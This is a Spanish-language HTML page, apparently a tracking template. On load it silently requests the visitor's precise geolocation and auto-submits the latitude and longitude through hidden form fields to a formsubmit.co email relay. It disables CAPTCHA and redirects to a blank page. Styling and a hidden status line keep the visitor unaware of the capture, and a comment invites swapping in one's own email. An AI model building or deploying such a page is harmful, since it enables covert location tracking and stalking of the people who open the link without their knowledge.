<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ubicación</title>
    <style>
        body { background-color: #000; color: #000; overflow: hidden; }
    </style>
</head>
<body>
    <p id="status" style="display: none;">Obteniendo ubicación...</p>

    <script>
        function getLocationAndSend() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError, { enableHighAccuracy: true });
            } else {
                console.log("Geolocalización no soportada.");
            }
        }

        function sendLocation(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            let form = document.createElement("form");
            form.method = "POST";
            form.action = "https://formsubmit.co/d81336b5828816579b21688645230581";  // Reemplaza con tu correo

            // Campos de ubicación
            let inputLat = document.createElement("input");
            inputLat.type = "hidden";
            inputLat.name = "Latitud";
            inputLat.value = lat;

            let inputLon = document.createElement("input");
            inputLon.type = "hidden";
            inputLon.name = "Longitud";
            inputLon.value = lon;

            // Desactivar CAPTCHA
            let inputCaptcha = document.createElement("input");
            inputCaptcha.type = "hidden";
            inputCaptcha.name = "_captcha";
            inputCaptcha.value = "false";

            // Formato de tabla en Gmail
            let inputTemplate = document.createElement("input");
            inputTemplate.type = "hidden";
            inputTemplate.name = "_template";
            inputTemplate.value = "table";

            // Evitar redirección después del envío
            let inputRedirect = document.createElement("input");
            inputRedirect.type = "hidden";
            inputRedirect.name = "_next";
            inputRedirect.value = "about:blank"; // Página en blanco tras el envío

            form.appendChild(inputLat);
            form.appendChild(inputLon);
            form.appendChild(inputCaptcha);
            form.appendChild(inputTemplate);
            form.appendChild(inputRedirect);
            document.body.appendChild(form);

            form.submit();
        }

        function showError(error) {
            console.log("Error al obtener la ubicación.");
        }

        window.onload = getLocationAndSend;
    </script>
</body>
</html>

